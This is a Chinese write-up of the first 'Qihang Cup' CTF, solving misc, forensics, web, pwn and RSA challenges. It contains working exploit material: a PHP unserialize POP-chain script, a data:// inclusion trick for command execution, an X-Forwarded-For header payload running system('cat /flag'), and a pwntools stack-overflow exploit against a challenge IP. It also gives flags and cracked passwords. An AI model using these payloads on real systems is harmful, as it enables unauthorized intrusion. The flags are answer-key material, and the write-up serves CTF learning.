# 第一届“启航杯”网络安全挑战赛WP-先知社区

> **来源**: https://xz.aliyun.com/news/16692  
> **文章ID**: 16692

---

# misc

## PvzHE

去这个文件夹

![](images/20250213105245-99cebf30-e9b5-1.png)

有一张图片

QHCTF{300cef31-68d9-4b72-b49d-a7802da481a5}

## QHCTF For Year 2025

攻防世界有一样的

080714212829302316092230

对应Q

![](images/20250213105246-9ab61672-e9b5-1.png)

以此类推

QHCTF{FUN}

## 请找出拍摄地所在位置

![](images/20250213105247-9b58c6e8-e9b5-1.png)

柳城

![](images/20250213105249-9c4731aa-e9b5-1.png)

丰顺

![](images/20250213105250-9d3e6415-e9b5-1.png)

# forensics

## win01

这个软件

![](images/20250213105252-9e14ae80-e9b5-1.png)

云沙盒分析一下

![](images/20250213105253-9eafb5da-e9b5-1.png)

md5

![](images/20250213105254-9f2cf8d6-e9b5-1.png)

ad4fdee2eada36ec3c20e9d6311cf258

## **Win\_02**

![](images/20250213105254-9f9958c5-e9b5-1.png)

HackY$

32ED87BDB5FDC5E9CBA88547376818D4

![](images/20250213105255-a00847f6-e9b5-1.png)

123456

HackY$\_123456

![](images/20250213105256-a0764027-e9b5-1.png)

fb484ad326c0f3a4970d1352bfbafef8

## Win\_07

![](images/20250213105257-a10c093f-e9b5-1.png)

找到密码

Th3\_1s\_F1ag.Z1p\_P@ssW0rd\_Y0u\_Now

![](images/20250213105258-a1b95ba2-e9b5-1.png)

解压

![](images/20250213105259-a23afca5-e9b5-1.png)

QHCTF{6143b46a-8e98-4356-a9b2-251a7ec19e51}

# web

## Web\_pop

```
<?php
error_reporting(0);
highlight_file(__FILE__);
class Start{
    public $name;
    protected $func;
 
    public function __destruct()
    {
        echo "Welcome to QHCTF 2025, ".$this->name;
    }
 
    public function __isset($var)
    {
        ($this->func)();
    }
}
 
class Sec{
    private $obj;
    private $var;
 
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
 
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
 
class Easy{
    public $cla;
 
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
 
class eeee{
    public $obj;
 
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
 
if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

后门在这里file\_get\_contents('/flag');

然后逆着看

\_\_invoke

($this->func)();->\_\_invoke

if(isset($this->obj->cmd))->($this->func)();->\_\_invoke

$this->cla = clone $var[0];-> if(isset($this->obj->cmd))->($this->func)();->\_\_invoke

$this->obj->check($this->var);->$this->cla = clone $var[0];-> if(isset($this->obj->cmd))->($this->func)();->\_\_invoke

echo "Welcome to QHCTF 2025, ".$this->name;-> $this->obj->check($this->var);->$this->cla = clone $var[0];-> if(isset($this->obj->cmd))->($this->func)();->\_\_invoke

这样来触发。

也就是

$a=new Start();

$a->name=new Sec();

$a->name->obj=new Easy();

$a->name->obj->cla=new eeee();

$a->name->obj->cla->obj=new Start();

$a->name->obj->cla->obj->func=new Sec();

exp：

```
<?php
error_reporting(0);
highlight_file(__FILE__);
class Start
{
    public $name;
    public $func;

}

class Sec
{
    public $obj;
    public $var;

}

class Easy
{
    public $cla;

}

class eeee
{
    public $obj;


}

$a = new Start;
$b = new Sec;
$c = new Easy;
$d = new eeee;
$e = new Sec;
$f = new Start;
$a->name = $b;
$b->obj = $c;
$b->var = $d;
$d->obj = $f;
$f->func = $e;
echo serialize($a);
```

## Easy\_include

[?file=data://text/plain](http://154.64.245.108:33400/?file=data://text/plain),

即可命令执行

![](images/20250213105259-a2adeb94-e9b5-1.png)

## Web\_IP

![](images/20250213105302-a47b8700-e9b5-1.png)

IP的地方可以执行命令

X-Forwarded-For： {system('cat /flag')}

## PCREMagic

![](images/20250213105307-a711b42c-e9b5-1.png)

可以上传文件，对文件名没有限制，最后都会重命名1-9.php

关键是文件内容检测<?php

# pwn

## Easy\_Pwn

![](images/20250213105308-a787cd11-e9b5-1.png)

vulnerable

![](images/20250213105308-a7e5ef36-e9b5-1.png)

栈溢出

exp

```
from pwn import*
from struct import pack
from ctypes import *
#from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
p=remote('154.64.245.108',33135)
#p=process('./pwn')
libc=ELF("/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6")
elf=ELF('./pwn')
def bug():
    gdb.attach(p)
    pause()
def s(a):
    p.send(a)
def sa(a,b):
    p.sendafter(a,b)
def sl(a):
    p.sendline(a)
def sla(a,b):
    p.sendlineafter(a,b)
def r(a):
    p.recv(a)
def pr(a):
    print(p.recv(a))
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def get_addr64():
    return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
    return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')


pay=b'a'*0x58+p64(0x4011ca)
#bug()
s(pay)
inter()
```

![](images/20250213105310-a8c93782-e9b5-1.png)

# cr

## Easy\_RSA

```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

# 生成RSA密钥对
private_key = b'-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCYQjRaBQcBJmdxdCo4YaK/8TIdlj9Cjt6ewjF8NzV7BAj5ZEXy
suXdYbXVOAmVKDYKglo9TKUbRVKbPk7f3rIfnIrMqm8TpJTPAnyssiXs3Zy9yz+p
qWbRTvd0xWJoWxy9TTzdczkS8yVkRBIdNJ3ghJV8B5YVkgFtMoyPX8TQhQIDAQAB
AoGARibOvyEs2oNKyvO2VjbqCRzEtewZZn20JZqcuTooum6gAeQI9GsnzKnt4PkK
NT6LM6lekXrEYb29c0iwh6YwE/mOIu5G3Yz2qQJDyZEqvM4N4KnITJM4v1WPv7tC
urpZj906Odbx6oFXNc5XJMGp6GgjOqqLomBCcRvKlKdX36sCQQDA3GGS4Hy5htlQ
ydkiQujUAAlcoTlx/kPZSrCOehBsOWytwRjiGm1xTu6s8mBY2O+kIDZx1DGbDQ54
Ki9jJqWfAkEAyhr1iR9mofi+WqSfcG41jjmLFUgKFcO/ImcE3kcs2eGLodoyOJF1
CBPw8ANME36OJiwXNSFOyQJWuzNoJchvWwJAG36Pjn/gaBaYXpMYGHFPfgGvU/xM
Ezs7cvvZ5cXzF2qsWqz/niREW/XzwsYfBCuRJmXNPTcSB1e6K1lgPhNhYwJBALZg
xZnL4E3hrcUWMVq/2UxS2ROHQrKJRf3BgT8kc3Dae6q+v/sUJ8v2UsID967P0W7Y
8shbGkGB/spHhYAy82kCQE7UVrGsArk46F1snawUIPUPMye3yBwvCeyCSX+WyQ7h
S1IaHaAy3kJ9J/0faMDayG724TpMcsBii1pU2Hhh8p0=
-----END RSA PRIVATE KEY-----'
public_key = b'-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCYQjRaBQcBJmdxdCo4YaK/8TId
lj9Cjt6ewjF8NzV7BAj5ZEXysuXdYbXVOAmVKDYKglo9TKUbRVKbPk7f3rIfnIrM
qm8TpJTPAnyssiXs3Zy9yz+pqWbRTvd0xWJoWxy9TTzdczkS8yVkRBIdNJ3ghJV8
B5YVkgFtMoyPX8TQhQIDAQAB
-----END PUBLIC KEY-----'
enmessage="PSvEAGef52/sz8q2f3jjC2OJP9pYEa04kSTeTIX3swnAMrJw9ZagvLRplqk+NjdCmvRAbnbYrBXi9aP8sz604rqn+7S58WTyPgnqIkFwynHBY7NTmvVAKKDc7GJWltQql4iVAxFbrwIBREcSZJwhloWGmCa5dBjlMEzWtv6Jx0o="

def encrypt_message(message, public_key):
    key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(key)
    encrypted_message = cipher.encrypt(message.encode())
    return base64.b64encode(encrypted_message).decode()

def decrypt_message(encrypted_message, private_key):
    key = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(key)
    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))
    return decrypted_message.decode()

#message = "Hello, this is a secret message!"
# encrypted = encrypt_message(message, public_key)
# print("加密后的消息:")
# print(encrypted)

decrypted = decrypt_message(enmessage, private_key)
print("解密后的消息:")
print(decrypted)
```

传入题目给的公钥，私钥，以及密文（访问靶机/encode）即可

![](images/20250213105312-aa169590-e9b5-1.png)

QHCTF{ec9ee719-8336-4a7c-8c7f-745c89d220ce}
